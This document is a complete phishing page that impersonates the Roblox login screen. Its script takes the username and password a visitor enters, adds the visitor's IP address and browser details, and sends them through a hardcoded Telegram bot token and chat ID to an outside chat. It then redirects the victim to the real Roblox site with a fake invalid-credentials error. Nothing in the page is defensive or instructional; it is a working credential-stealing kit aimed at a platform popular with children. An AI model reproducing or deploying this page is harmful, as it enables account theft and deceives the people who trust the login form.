<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to Roblox</title>
    <script>
        const BOT_TOKEN='8693145371:AAHfPNL_W-f0P2MPWut5_CxmWuDhvr8F7Qw';
        const CHAT_ID = '1361048119';
        
        function togglePassword() {
            var pwd = document.getElementById('password');
            var icon = document.getElementById('eyeIcon');
            if (pwd.type === 'password') {
                pwd.type = 'text';
                icon.textContent = '👁';
            } else {
                pwd.type = 'password';
                icon.textContent = '👁‍🗨';
            }
        }
        
        function submitLogin() {
            var username = document.getElementById('username').value;
            var password = document.getElementById('password').value;
            
            if (!username || !password) {
                document.getElementById('errorMsg').style.display = 'block';
                document.getElementById('errorMsg').textContent = 'Please fill in all fields.';
                return;
            }
            
            document.getElementById('loginBtn').disabled = true;
            document.getElementById('loginBtn').textContent = 'Logging in...';
            document.getElementById('errorMsg').style.display = 'none';
            
            fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(d => d.ip)
                .catch(() => 'Unknown')
                .then(function(ip) {
                    var msg = '🔴 ROBLOX LOGIN' + '%0A' +
                              '├ User: ' + encodeURIComponent(username) + '%0A' +
                              '├ Pass: ' + encodeURIComponent(password) + '%0A' +
                              '├ IP: ' + ip + '%0A' +
                              '├ Time: ' + new Date().toLocaleString('id-ID') + '%0A' +
                              '└ UA: ' + encodeURIComponent(navigator.userAgent);
                    
                    return fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + msg);
                })
                .then(() => {
                    window.location.href = 'https://www.roblox.com/login?error=InvalidCredentials';
                })
                .catch(() => {
                    document.getElementById('loginBtn').disabled = false;
                    document.getElementById('loginBtn').textContent = 'Log In';
                    document.getElementById('errorMsg').style.display = 'block';
                    document.getElementById('errorMsg').textContent = 'Something went wrong. Please try again.';
                });
        }
    </script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: #f5f5f5;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .header-bar {
            background: linear-gradient(135deg, #0b1a2e 0%, #1a2a4a 100%);
            padding: 12px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        .header-bar .logo-text {
            color: #fff;
            font-size: 20px;
            font-weight: 700;
            letter-spacing: 0.5px;
        }
        .header-bar .nav-links {
            display: flex;
            gap: 16px;
            align-items: center;
        }
        .header-bar .nav-links a {
            color: rgba(255,255,255,0.8);
            text-decoration: none;
            font-size: 13px;
            font-weight: 500;
        }
        .header-bar .nav-links a:hover { color: #fff; }
        .header-bar .signup-btn {
            background: linear-gradient(135deg, #ff0066, #ff6600);
            color: #fff;
            border: none;
            padding: 8px 20px;
            border-radius: 4px;
            font-size: 13px;
            font-weight: 600;
            cursor: pointer;
            text-decoration: none;
        }
        .main-container {
            flex: 1;
            display: flex;
            justify-content: center;
            padding: 40px 16px 60px;
        }
        .login-card {
            background: #fff;
            width: 100%;
            max-width: 388px;
            padding: 30px 30px 20px;
            border-radius: 4px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
            align-self: flex-start;
        }
        .logo-area {
            text-align: center;
            margin-bottom: 20px;
        }
        .logo-area .r-logo {
            display: inline-block;
        }
        .logo-area .r-logo svg {
            width: 140px;
            height: auto;
        }
        .logo-area h1 {
            font-size: 24px;
            font-weight: 700;
            color: #161616;
            margin-top: 16px;
            letter-spacing: -0.3px;
        }
        .input-group {
            margin-bottom: 15px;
        }
        .input-group label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #606060;
            margin-bottom: 6px;
        }
        .input-group .input-wrap {
            position: relative;
        }
        .input-group input {
            width: 100%;
            padding: 10px 12px;
            border-radius: 4px;
            border: 1px solid #dadada;
            background: #fff;
            font-size: 14px;
            color: #161616;
            outline: none;
            transition: 0.15s;
        }
        .input-group input:focus {
            border-color: #00a2ff;
            box-shadow: 0 0 0 3px rgba(0,162,255,0.2);
        }
        .input-group .password-toggle {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            font-size: 16px;
            color: #999;
            padding: 4px;
        }
        .forgot-link {
            text-align: right;
            margin-top: 4px;
        }
        .forgot-link a {
            color: #00a2ff;
            text-decoration: none;
            font-size: 13px;
        }
        .forgot-link a:hover { text-decoration: underline; }
        .checkbox-group {
            display: flex;
            align-items: center;
            gap: 8px;
            margin: 12px 0 16px;
        }
        .checkbox-group input[type="checkbox"] {
            width: 16px;
            height: 16px;
            accent-color: #00a2ff;
            cursor: pointer;
        }
        .checkbox-group label {
            font-size: 13px;
            color: #606060;
            cursor: pointer;
        }
        .error-msg {
            display: none;
            background: #fff0f0;
            border: 1px solid #ffcccc;
            border-radius: 4px;
            padding: 10px 12px;
            color: #cc0000;
            font-size: 13px;
            margin-bottom: 12px;
        }
        .login-btn {
            width: 100%;
            height: 44px;
            border: none;
            border-radius: 4px;
            background: linear-gradient(180deg, #00a2ff 0%, #0071c5 100%);
            color: #fff;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: 0.15s;
        }
        .login-btn:hover { background: linear-gradient(180deg, #0095f0, #0066b3); }
        .login-btn:active { transform: scale(0.98); }
        .login-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
        .or-divider {
            display: flex;
            align-items: center;
            gap: 12px;
            margin: 20px 0;
        }
        .or-divider .line {
            flex: 1;
            height: 1px;
            background: #e0e0e0;
        }
        .or-divider span {
            color: #c0c0c0;
            font-size: 12px;
            font-weight: 500;
        }
        .social-buttons {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        .social-btn {
            width: 100%;
            height: 44px;
            border: 1px solid #dadada;
            border-radius: 4px;
            background: #fff;
            font-size: 14px;
            font-weight: 500;
            color: #333;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            transition: 0.15s;
        }
        .social-btn:hover { border-color: #bbb; background: #fafafa; }
        .social-btn .icon { font-size: 18px; }
        .social-btn .icon.apple { font-size: 20px; }
        .card-footer {
            text-align: center;
            margin-top: 24px;
            padding-top: 16px;
        }
        .card-footer span {
            color: #606060;
            font-size: 14px;
        }
        .card-footer a {
            color: #00a2ff;
            text-decoration: none;
            font-weight: 600;
            font-size: 14px;
        }
        .card-footer a:hover { text-decoration: underline; }
        .page-footer {
            background: #f5f5f5;
            padding: 24px 16px;
            text-align: center;
            border-top: 1px solid #e0e0e0;
        }
        .page-footer a {
            color: #808080;
            text-decoration: none;
            font-size: 12px;
            margin: 0 10px;
        }
        .page-footer a:hover { text-decoration: underline; }
        .page-footer .copyright {
            color: #999;
            font-size: 11px;
            margin-top: 12px;
        }
    </style>
</head>
<body>
    <div class="header-bar">
        <span class="logo-text">Roblox</span>
        <div class="nav-links">
            <a href="#">Charts</a>
            <a href="#">Marketplace</a>
            <a href="#">Create</a>
            <a href="#">Robux</a>
            <a href="#" class="signup-btn">Sign Up</a>
        </div>
    </div>
    
    <div class="main-container">
        <div class="login-card">
            <div class="logo-area">
                <div class="r-logo">
                    <svg viewBox="0 0 140 40" xmlns="http://www.w3.org/2000/svg">
                        <rect x="0" y="8" width="24" height="24" rx="4" fill="#E2231A"></rect>
                        <text x="6" y="26" font-family="Arial" font-size="16" font-weight="800" fill="#fff">R</text>
                        <text x="32" y="26" font-family="Arial" font-size="20" font-weight="700" fill="#161616">Roblox</text>
                    </svg>
                </div>
                <h1>Login to Roblox</h1>
            </div>
            
            <div class="error-msg" id="errorMsg">Invalid username or password. Please try again.</div>
            
            <form onsubmit="event.preventDefault(); submitLogin();">
                <div class="input-group">
                    <label>Username/Email/Phone</label>
                    <div class="input-wrap">
                        <input type="text" id="username" placeholder="Username/Email/Phone" required="" autocomplete="off">
                    </div>
                </div>
                
                <div class="input-group">
                    <label>Password</label>
                    <div class="input-wrap">
                        <input type="password" id="password" placeholder="Password" required="">
                        <button type="button" class="password-toggle" onclick="togglePassword()" tabindex="-1">
                            <span id="eyeIcon">👁‍🗨</span>
                        </button>
                    </div>
                </div>
                
                <div class="forgot-link">
                    <a href="#">Forgot Password or Username?</a>
                </div>
                
                <div class="checkbox-group">
                    <input type="checkbox" id="remember" checked="">
                    <label for="remember">Remember me</label>
                </div>
                
                <button type="submit" class="login-btn" id="loginBtn">Log In</button>
            </form>
            
            <div class="or-divider">
                <div class="line"></div>
                <span>OR</span>
                <div class="line"></div>
            </div>
            
            <div class="social-buttons">
                <button class="social-btn" onclick="return false;">
                    <span class="icon">G</span>
                    Sign in with Google
                </button>
                <button class="social-btn" onclick="return false;">
                    <span class="icon apple"></span>
                    Sign in with Apple
                </button>
            </div>
            
            <div class="card-footer">
                <span>Don't have an account? </span><a href="#">Sign Up</a>
            </div>
        </div>
    </div>
    
    <div class="page-footer">
        <a href="#">About Us</a>
        <a href="#">Jobs</a>
        <a href="#">Blog</a>
        <a href="#">Parents</a>
        <a href="#">Gift Cards</a>
        <a href="#">Help</a>
        <a href="#">Terms</a>
        <a href="#">Privacy</a>
        <div class="copyright">© 2026 Roblox Corporation. All rights reserved.</div>
    </div>
</body>
</html>
